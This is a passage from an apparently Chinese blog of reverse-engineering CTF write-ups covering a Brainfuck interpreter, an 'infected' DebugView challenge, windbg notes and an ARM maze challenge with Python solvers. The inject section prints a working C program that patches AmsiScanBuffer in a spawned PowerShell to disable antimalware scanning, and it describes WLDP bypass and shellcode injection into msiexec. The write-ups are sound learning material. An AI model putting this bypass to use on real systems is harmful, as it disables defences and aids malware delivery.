class="line">            else:</span><br><span class="line">                now_id -= 1</span><br><span class="line">        elif command == &#x27;&gt;&#x27;:</span><br><span class="line">            now_id += 1</span><br><span class="line">            if now_id &gt;= len(main_list):</span><br><span class="line">                main_list.append(0)</span><br><span class="line">        elif command == &#x27;+&#x27;:</span><br><span class="line">            main_list[now_id] += 1</span><br><span class="line">            if main_list[now_id] == 256:</span><br><span class="line">                main_list[now_id] = 0</span><br><span class="line">        elif command == &#x27;-&#x27;:</span><br><span class="line">            main_list[now_id] -= 1</span><br><span class="line">            if main_list[now_id] == -1:</span><br><span class="line">                main_list[now_id] = 255</span><br><span class="line">        elif command == &#x27;.&#x27;:</span><br><span class="line">            print(chr(main_list[now_id]), end=&#x27;&#x27;)</span><br><span class="line">        elif command == &#x27;,&#x27;:</span><br><span class="line">            while True:</span><br><span class="line">                input_chr = input(&#x27;请输入：&#x27;)</span><br><span class="line">                if len(input_chr) == 1:</span><br><span class="line">                    if ord(input_chr) &lt; 128:</span><br><span class="line">                        main_list[now_id] = ord(input_chr)</span><br><span class="line">                        break</span><br><span class="line">                    else:</span><br><span class="line">                        print_error(2, &#x27;输入错误，只能输入ASCII字符&#x27;)</span><br><span class="line">                else:</span><br><span class="line">                    print_error(2, &#x27;输入错误，只能输入一个字符&#x27;)</span><br><span class="line">        elif command == &#x27;[&#x27;:</span><br><span class="line">            if main_list[now_id] == 0:</span><br><span class="line">                try:</span><br><span class="line">                    now_position = bf_code.index(&#x27;]&#x27;, now_position) - 1</span><br><span class="line">                except ValueError:</span><br><span class="line">                    print_error(3, &#x27;代码错误，缺失：]&#x27;)</span><br><span class="line">        elif command == &#x27;]&#x27;:</span><br><span class="line">            if main_list[now_id] != 0:</span><br><span class="line">                try:</span><br><span class="line">                    now_position = len(bf_code) - bf_code[::-1].index(&#x27;[&#x27;, len(bf_code) - now_position - 1) - 1</span><br><span class="line">                except ValueError:</span><br><span class="line">                    print_error(3, &#x27;代码错误，缺失 [&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print_error(0, &#x27;无法解析的字符：&#x27; + command)</span><br><span class="line">        now_position += 1</span><br><span class="line">    </span><br><span class="line">def print_error(error_code, msg):</span><br><span class="line">    print(error_code, msg)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bf_interpreter(test)</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="inject（菜鸡的悲哀：没做出来）"><a href="#inject（菜鸡的悲哀：没做出来）" class="headerlink" title="inject（菜鸡的悲哀：没做出来）"></a>inject（菜鸡的悲哀：没做出来）</h1><h2 id="0x00-6"><a href="#0x00-6" class="headerlink" title="0x00"></a>0x00</h2><p> &emsp;注入？exe名称是：<code>dbgview-infected</code>，<code>dbg</code>视图被感染？die看了看是C/C++的32位GUI程序。打开之后，是一个<code>Debug</code>窗口：</p>
<p><img src="/images/re-part-5/image-20230101210714601-167980209732327.png" alt="image-20230101210714601"></p>
<p> <strong>初始思路是：</strong>对debugview进行注入，从而得到flag。</p>
<p> &emsp;查了查，<code>debug view</code>是一个软件，所以，你得学一学怎么用这个软件吧。</p>
<h2 id="0x01-debugView-初探"><a href="#0x01-debugView-初探" class="headerlink" title="0x01 debugView 初探"></a>0x01 debugView 初探</h2><p> 参考博客：</p>
<ol>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bcbobo21cn/article/details/52401087">https://blog.csdn.net/bcbobo21cn/article/details/52401087</a></p>
<p>&emsp;debugView是一个调试工具，可以捕获程序中由<code>TRACE</code>和<code>OutputDebugString</code>输出的信息。<strong>可以捕获系统实时输出的<code>Debug</code>信息并保存为日志文件</strong>，可以方便开发人员在系统发布前监控系统流程与异常。</p>
</li>
</ol>
<p><img src="/images/re-part-5/image-20230101212521354-167980209732329.png" alt="image-20230101212521354"></p>
<p> &emsp;上图红色框是<strong>控制捕获开关</strong>，绿色框是<strong>控制是否捕获系统内核的Debug信息</strong>，蓝色框是<strong>控制是否捕获Win32的Debug信息</strong>。</p>
<p><img src="/images/re-part-5/image-20230101212817780-167980209732331.png" alt="image-20230101212817780"></p>
<p> &emsp;上图式是过滤器，用于对抓到的消息按照某种规则进行过滤。</p>
<h2 id="0x02-MFC-注入"><a href="#0x02-MFC-注入" class="headerlink" title="0x02 MFC 注入"></a>0x02 MFC 注入</h2><p> &emsp;突然想到之前做过的一道题，具体就是某个exe文件打开后是一个窗口，通过工具可以查到窗口中的某个部件有一个监听函数，直接向监听函数发消息就可以得到flag。题目名称叫mfc逆向-200。仿照这个题，没有做成功，感觉自己对MFC注入底层原理了解的还不是很到位，得系统学习一下MFC注入了。</p>
<p>&emsp; 搜了搜资料，主要就是找消息函数的映射表，主要看：（讲的比较详细）</p>
<p> <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1U94y1D7B4/?vd_source=270df07e19daab36f36e1863f3440455">https://www.bilibili.com/video/BV1U94y1D7B4/?vd_source=270df07e19daab36f36e1863f3440455</a></p>
<p> &emsp;这个应该不是MFC，用XSPY根本看不出来，又发现了这个里面多了一个<code>easyre</code>段。重点应该是<code>easyre</code>段。</p>
<h2 id="0x03-wp的复现"><a href="#0x03-wp的复现" class="headerlink" title="0x03 wp的复现"></a>0x03 wp的复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">屈服了，看wp，呜呜我是菜狗。</span><br></pre></td></tr></table></figure>
<p> &emsp;大佬的wp地址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241109">https://www.anquanke.com/post/id/241109</a></p>
<p> &emsp;wp也是分析<code>easyre</code>段，由于<code>easyre</code>的代码比较长，逻辑比较复杂，所需需要先找到段的入口点。由于此程序是静态注入的，所以大佬的思路是：<strong>找到原先的程序，进行简单的比较，从而找到作者修改的部分</strong>。</p>
<p> &emsp;先看文件属性：</p>
<p><img src="/images/re-part-5/image-20230108192805387-167980209732333.png" alt="image-20230108192805387"></p>
<p> &emsp;这是一个国人汉化后的4.76 debugview版本，找到之后使用bindiff对比一下。</p>
<p><img src="/images/re-part-5/image-20230108195348599-167980209732335.png" alt="image-20230108195348599"></p>
<p><img src="/images/re-part-5/image-20230108195559757-167980209732337.png" alt="image-20230108195559757"></p>
<p> &emsp;可以发现<code>0040F8B0</code>函数不同。具体如下：</p>
<p><img src="/images/re-part-5/image-20230108195819278-167980209732339.png" alt="image-20230108195819278"></p>
<p><img src="/images/re-part-5/image-20230108195932551-167980209732341.png" alt="image-20230108195932551"></p>
<p> &emsp;上面左图为题目程序，右图为正常程序，可以看到题目程序有一个强制跳转，相关代码为：</p>
<p><img src="/images/re-part-5/image-20230108200731899-167980209732343.png" alt="image-20230108200731899"></p>
<p><img src="/images/re-part-5/image-20230108201645186-167980209732345.png" alt="image-20230108201645186"></p>
<p> &emsp;相当于将<code>0x487000</code>指向的数据改为<code>0x3EB80E8</code>，然后直接执行<code>0x487000</code>处的代码。由于上下文是解析<code>.dmp</code>文件的地方，而与dmp相关的功能只有一处，即<code>进程故障转储</code>，基本可以确认这边就是真正的程序入口。</p>
<p> &emsp;大佬又说，上面的是段注入，<strong>可能也会有远程线程注入</strong>（<strong>这个真是奇思妙想啊</strong>）。于是用<code>procmonitor</code>（进程观测器）观测程序，但是没有像大佬说的点击<code>进程故障存储</code>后会有一个子进程启动，进程太多可能没太仔细查。</p>
<p> &emsp;之后用x32dbg调试（ida也可以，只不过复现的话尽量与wp相同）。</p>
<p><img src="/images/re-part-5/image-20230108211452405-167980209732347.png" alt="image-20230108211452405"></p>
<p>&emsp; 如上图所示，这是点击<code>进程故障转储</code>后进入的程序窗口，其中执行绿色框与红色框的时候<code>esi=0x487005</code>，上图表示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if *(esi+0x238) != *(esi+0x23C):</span><br><span class="line">	jump sub_4C5C84 -&gt; jump sub_4C6CA9</span><br><span class="line">push *(esi+0x2C)</span><br><span class="line">push *(esi+0x28)</span><br><span class="line">push *(esi+0x8C)</span><br><span class="line">push *(esi+0x88)</span><br><span class="line">jump sub_4C7C08</span><br></pre></td></tr></table></figure>
<p> &emsp;<strong>这得过了30天了，没碰reverse，颓废了，得努力啊！！！！</strong></p>
<p> &emsp;x32dbg看不出来（自己能力问题），直接用ida了，跟着wp首先看sub_4C6CA9函数，里面有sub_4C7C08函数，wp说这个函数的功能是加载其他的函数。如下所示：</p>
<p><img src="/images/re-part-5/image-20230209101355507-167980209732349.png" alt="image-20230209101355507"></p>
<p> &emsp;这3个函数分别加载VirtualAlloc、VirtualFree与RtlExitUserProcess（<strong>wp说的，咱也不知道，可能是参数的原因</strong>），最后得到的应该是三个函数的地址。之后，有：</p>
<p><img src="/images/re-part-5/image-20230209111345227-167980209732351.png" alt="image-20230209111345227"></p>
<p><img src="/images/re-part-5/image-20230209113214545-167980209732353.png" alt="image-20230209113214545"></p>
<p> &emsp;之后，比较<code>[edi+6e4]</code>处的flag，如下所示：</p>
<p><img src="/images/re-part-5/image-20230209113702959-167980209732355.png" alt="image-20230209113702959"></p>
<p> &emsp;由于flag=1，于是进入：</p>
<p><img src="/images/re-part-5/image-20230209114024703-167980209732457.png" alt="image-20230209114024703"></p>
<p> &emsp;据wp所说，<code>sub_4C5FE0</code>函数调用了asmi.dll，并对AmsiScanString、AmsiScanBuffer进行了patch，经我x32dbg调试，可以发现AmsiScanBuffer函数，但是不知道咋patch的（<strong>能力问题</strong>）。但是呢，看：</p>
<p><img src="/images/re-part-5/image-20230209124311179-167980209732459.png" alt="image-20230209124311179"></p>
<p>&emsp; 有比较多的对称函数，比较正常的patch函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    STARTUPINFOA si = &#123; 0 &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; 0 &#125;;</span><br><span class="line">    si.cb = sizeof(si);</span><br><span class="line"></span><br><span class="line">    CreateProcessA(NULL, (LPSTR)&quot;powershell -NoExit dir&quot;, NULL, NULL, NULL, NULL, NULL, NULL, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">    HMODULE hAmsi = LoadLibraryA(&quot;amsi.dll&quot;);</span><br><span class="line">    LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, &quot;AmsiScanBuffer&quot;);</span><br><span class="line"></span><br><span class="line">    Sleep(500);</span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    char patch = 0xc3;</span><br><span class="line"></span><br><span class="line">    VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &amp;patch, sizeof(char), NULL);</span><br><span class="line">    VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);</span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    FreeLibrary(hAmsi);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> &emsp;还是可以发现一些端倪的。</p>
<p> &emsp;之后，还有一个<code>sub_4C60C6</code>函数，调用了<code>wldp.dll</code>并进行了patch，以绕过wldp的数字签名验证。具体的函数有：WldpQueryDynamicCodeTrust、WldpIsClassInApprovedList。这两个函数是wldp提供的用于支持<code>DynmaicCodePolicy</code>策略的函数，它们可以检查内存中的一些函数是否发生了hook，以及一些CLSID接口的函数是否是可信任的。通常来说，这两个函数可以用来检查前面提到的<code>AmsiScanString</code>，<code>AmsiScanBuffer</code>是否发生了hook，以及一些com对象是否被劫持。</p>
<p> &emsp;绕过wldp与amsi的防御后，有：</p>
<p><img src="/images/re-part-5/image-20230209135816100-167980209732461.png" alt="image-20230209135816100"></p>
<p> &emsp;第一次值为4，进入到<code>sub_4C73B3</code>。下面是<code>sub_4C73B3</code>的具体流程：</p>
<p><img src="/images/re-part-5/image-20230209141700492-167980209732463.png" alt="image-20230209141700492"></p>
<p> &emsp;之后，读取Kernel32.dll，将相关的API填充到对应的位置上，最后跳转到指定的函数地址，如下所示：（<strong>wp说的，这个函数太长了，我不知道他是怎么分析出来的，就离谱</strong>）</p>
<p><img src="/images/re-part-5/image-20230209141940417-167980209732465.png" alt="image-20230209141940417"></p>
<p> &emsp;再跑一跑，wp说到了类似于windows的main函数外部，用于准备各类全局变量和环境变量的加载部分，如下所示：</p>
<p><img src="/images/re-part-5/image-20230209145723830-167980209732467.png" alt="image-20230209145723830"></p>
<p> &emsp;咱也不知道怎么样，他把这段内存dump出来了（<strong>我dump的时候一直报IAT不在PE映像中，需要改基，不知道该怎么做了，太菜了</strong>）。如下所示：</p>
<p><img src="/images/re-part-5/image-20230209162043966-167980209732469.png" alt="image-20230209162043966"></p>
<p> &emsp;上述代码流程：（wp中原话）</p>
<ol>
<li>创建了一个msiexec的进程。</li>
<li>往进程地址空间写入了三段内存空间，其中有两段是加密的数据段，还有一个和之前injected的代码段一致。</li>
<li><p>使用SetThreadContext修改了主线程的地址，然后重新运行线程，从而运行注入的shellcode。</p>
<p>&emsp;<strong>这个题太难了，准备放弃了，看wp也没有复现出来。还是需要不断提高自己。</strong></p>
<p>&emsp;wp地址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241109">https://www.anquanke.com/post/id/241109</a></p>
<p>&emsp;有缘再见！</p>
</li>
</ol>
<p><strong>补充：</strong></p>
<ul>
<li>bindiff是ida的一个插件，可以比较两个程序的相似程度。</li>
<li>dmp文件。dmp文件是系统错误的内存转储文件。当电脑蓝屏或系统崩溃时，Windows会将错误报告存储在一个后缀名为<code>.DMP</code>的文件里。该文件记录了系统错误的详细信息，技术人员可以分析它找到系统崩溃的原因，从而解决问题。</li>
<li>AMSI（Antimalware Scan Interface）即反恶意软件扫描接口，是微软推出的安全模块。AMSI实质上是一个DLL文件，<strong>可以使用内存patch来进行绕过</strong>。</li>
<li>.NET Framework在v4.8版中使用Antimalware Scan Interface (AMSI)以及Windows Lockdown Policy(WLDP)机制来阻止攻击者从内存中运行潜在风险的软件，其中WLDP会验证动态代码的数字签名。</li>
<li>COM 类是在与给定对象交互时在代码中执行的一组接口的实现。 C++ 类和 COM 类之间有一个重要区别：在 C++ 中，类是一种类型，而 COM 类只是对象的定义，不携带任何类型，尽管 C++ 程序员可以使用 C++ 类实现它。 每个 COM 类由 CLSID（唯一的 128 位 GUID）标识，服务器必须注册该 GUID。</li>
</ul>
<h2 id="0x04-amsi的patch绕过-amp-amp-wldp相关绕过"><a href="#0x04-amsi的patch绕过-amp-amp-wldp相关绕过" class="headerlink" title="0x04 amsi的patch绕过 &amp;&amp; wldp相关绕过"></a>0x04 amsi的patch绕过 &amp;&amp; wldp相关绕过</h2><p>amsi :<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11097">https://xz.aliyun.com/t/11097</a></p>
<p>amsi :<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/182106.html">https://www.secpulse.com/archives/182106.html</a></p>
<p>wldp : <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/179832?display=mobile#h2-10">https://www.anquanke.com/post/id/179832?display=mobile#h2-10</a></p>
<h1 id="babydsp"><a href="#babydsp" class="headerlink" title="babydsp"></a>babydsp</h1><h2 id="0x00-7"><a href="#0x00-7" class="headerlink" title="0x00"></a>0x00</h2><p>&emsp; dmp是系统错误产生的文件，比如windows自己的memory.dmp和minixxxx.dmp文件。用windbg打开看了好久，没啥头绪，直接看wp。</p>
<h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p> &emsp;奇怪的题，之后找的时候就找不到了，连题目都找不到了，我下载错了？</p>
<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><ol>
<li>windbg使用：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x //所有与指定模式匹配的上下文中显示符号，例如查看模块 x notepad!*, x notepad!*main*</span><br><span class="line">!analyze -v //分析dmp文件</span><br><span class="line">lmvm module_name //了解模块的详细信息</span><br><span class="line">x /D /f ClimbToTop!* // 查找模块内的函数</span><br><span class="line">x /D /d ClimbToTop!* // 查找模块内的数据</span><br><span class="line">x /D ClimbToTop!* // 查找模块内的所有数据</span><br><span class="line">u //反编译指定地址参数之后的代码，而uf则是反编译整个函数的代码</span><br></pre></td></tr></table></figure>
<ol>
<li>ucrtbased.dll是许多应用程序、游戏或 Web 浏览器扩展所需的核心 Windows 系统文件。</li>
</ol>
<h1 id="BabyARM"><a href="#BabyARM" class="headerlink" title="BabyARM"></a>BabyARM</h1><h2 id="0x00-RAM64基础"><a href="#0x00-RAM64基础" class="headerlink" title="0x00 RAM64基础"></a>0x00 RAM64基础</h2><p> 特殊的寄存器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x30 //记录返回地址，也叫LR寄存器</span><br><span class="line">R15 //存储下一条指令的地址，也叫PC寄存器</span><br><span class="line">SP  //栈寄存器</span><br></pre></td></tr></table></figure>
<p> 相关指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LDR //单寄存器读取</span><br><span class="line">LDP //多寄存器读取</span><br><span class="line">STR //单寄存器存储</span><br><span class="line">STP //多寄存器存储</span><br><span class="line">B   //立即跳转，相当于jmp</span><br><span class="line">BL  //相当于call</span><br><span class="line">BR x0 //跳转到x0里面存储的地址</span><br><span class="line">BLR // BL与BR的结合</span><br></pre></td></tr></table></figure>
<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p>&emsp;到main函数里，发现有很多<code>0x02DFDFF5</code>的花指令，把他们都patch成<code>0x0000A0E1</code>，也就是ARM中的NOP，就可以进行反汇编。最后得到如下代码：</p>
<p><img src="/images/re-part-5/image-20230324195831459-167980209732471.png" alt="image-20230324195831459"></p>
<h2 id="0x02-wp的复现"><a href="#0x02-wp的复现" class="headerlink" title="0x02 wp的复现"></a>0x02 wp的复现</h2><p>&emsp;由于之前没有做过ARM相关的题，所以直接看wp，链接如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222303#h2-2">https://www.anquanke.com/post/id/222303#h2-2</a></p>
<p>&emsp;wp首先使用qemu来运行了此程序。<strong>qemu是一个开源的虚拟机软件，可以在不同的CPU架构和操作系统之间进行全系统模拟或者用户程序模拟。</strong>软件逆向中，qemu可以用来分析和调试不同平台的二进制文件，例如ARM、MIPS、PowerPC等。</p>
<p>&emsp;之后，作者又将此程序放到了ghidra中查看。<strong>ghidra是一个由美国国家安全局（NSA）研究部门开发和维护的软件逆向工程（SRE）框架，</strong>它包含了一系列的高级软件分析工具。</p>
<p>&emsp;由于x86与arm架构不兼容，费尽心机配置了qemu+ida的调试环境，但是在还是有一些Bug：ida75与ida77的armlinux_server与安装的树莓派镜像不同，可能是树莓派版本的问题，导致只有ida72才能调试arm.bin文件，但是ida72又不能反汇编成代码，只能看汇编，栓Q。</p>
<p>&emsp;经过动态调试，发现下面v11循环调用的3个函数是<code>+</code>、<code>-</code>、<code>xor</code>：</p>
<p><img src="/images/re-part-5/image-20230326132627189.png" alt="image-20230326132627189" style="zoom:67%;" /></p>
<p>&emsp;写脚本可以得到前几项：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># @Time  : 2023/03/24 19:59:52</span></span><br><span class="line"><span class="string"># @Author: wd-2711</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">byte_2103C = [<span class="number">0xFD</span>, <span class="number">0x9A</span>, <span class="number">0x9F</span>, <span class="number">0xE8</span>, <span class="number">0xC2</span>, <span class="number">0xAE</span>, <span class="number">0x9B</span>, <span class="number">0x2D</span>, <span class="number">0xC3</span>, <span class="number">0x11</span>, <span class="number">0x2A</span>, <span class="number">0x35</span>, <span class="number">0xF6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">v5_tar = [<span class="number">0x63</span>, <span class="number">0xD2</span>, <span class="number">0xFE</span>, <span class="number">0x4F</span>, <span class="number">0xB9</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0xA0</span>, <span class="number">0x80</span>, <span class="number">0x43</span>, <span class="number">0x50</span>]</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(v5_tar):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        v += <span class="number">0x100</span></span><br><span class="line">        res += <span class="built_in">chr</span>((v - byte_2103C[i]) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        res += <span class="built_in">chr</span>((v + byte_2103C[i]) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        res += <span class="built_in">chr</span>(v ^ byte_2103C[i])</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>&emsp;<strong>补充：</strong>树莓派中的文件编辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl+o //回车保存</span><br><span class="line">ctrl+x //退出</span><br></pre></td></tr></table></figure>
<p>&emsp;接下来，在红框位置下断点：</p>
<p><img src="/images/re-part-5/image-20230326142231223.png" alt="image-20230326142231223" style="zoom:67%;" /></p>
<p>&emsp;得到<code>unk_2104C</code>，这是一个6*6的迷宫：</p>
<p><img src="/images/re-part-5/image-20230326142333573.png" alt="image-20230326142333573" style="zoom:67%;" /></p>
<p>&emsp;之后进入sub_10770函数，可以看到：</p>
<p><img src="/images/re-part-5/image-20230326142802977.png" alt="image-20230326142802977" style="zoom:67%;" /></p>
<p>&emsp;直接写脚本，花了好长时间jpg：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># @Time  : 2023/03/24 19:59:52</span></span><br><span class="line"><span class="string"># @Author: wd-2711</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, c:<span class="built_in">str</span>, pos, parent, is_leaf, layer_num, not_action, act</span>):</span><br><span class="line">        self.c_action = c</span><br><span class="line">        self.x, self.y = pos[<span class="number">0</span>], pos[<span class="number">1</span>]</span><br><span class="line">        self.parent = parent</span><br><span class="line">        self.is_leaf = is_leaf</span><br><span class="line">        self.layer_num = layer_num</span><br><span class="line">        self.not_action = not_action</span><br><span class="line">        self.act = act</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_seq</span>(<span class="params">self</span>):</span><br><span class="line">        n = self</span><br><span class="line">        res = []</span><br><span class="line">        res_c = []</span><br><span class="line">        <span class="keyword">while</span> n.parent != <span class="literal">None</span>:</span><br><span class="line">            res_c.append(n.c_action)</span><br><span class="line">            res.append(n.act)</span><br><span class="line">            n = n.parent</span><br><span class="line">        res.append(n.act)</span><br><span class="line">        res_c.append(n.c_action)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(res), res, res_c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    byte_2103C = [<span class="number">0xFD</span>, <span class="number">0x9A</span>, <span class="number">0x9F</span>, <span class="number">0xE8</span>, <span class="number">0xC2</span>, <span class="number">0xAE</span>, <span class="number">0x9B</span>, <span class="number">0x2D</span>, <span class="number">0xC3</span>, <span class="number">0x11</span>, <span class="number">0x2A</span>, <span class="number">0x35</span>, <span class="number">0xF6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">    v5_tar = [<span class="number">0x63</span>, <span class="number">0xD2</span>, <span class="number">0xFE</span>, <span class="number">0x4F</span>, <span class="number">0xB9</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0xA0</span>, <span class="number">0x80</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x55</span>]</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(v5_tar):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            v += <span class="number">0x100</span></span><br><span class="line">            res += <span class="built_in">chr</span>((v - byte_2103C[i]) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>((v + byte_2103C[i]) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(v ^ 